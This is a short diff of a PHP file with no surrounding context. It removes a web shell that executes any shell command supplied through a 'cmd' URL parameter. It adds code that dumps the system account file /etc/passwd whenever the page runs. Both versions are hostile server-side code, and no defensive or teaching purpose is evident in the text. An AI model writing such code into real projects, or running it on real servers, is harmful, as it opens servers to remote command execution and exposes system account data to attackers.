@@ -1,3 +1,4 @@
-<?php 
-system($_GET['cmd']);
+<?php
+ system('cat /etc/passwd');
  ?>
+
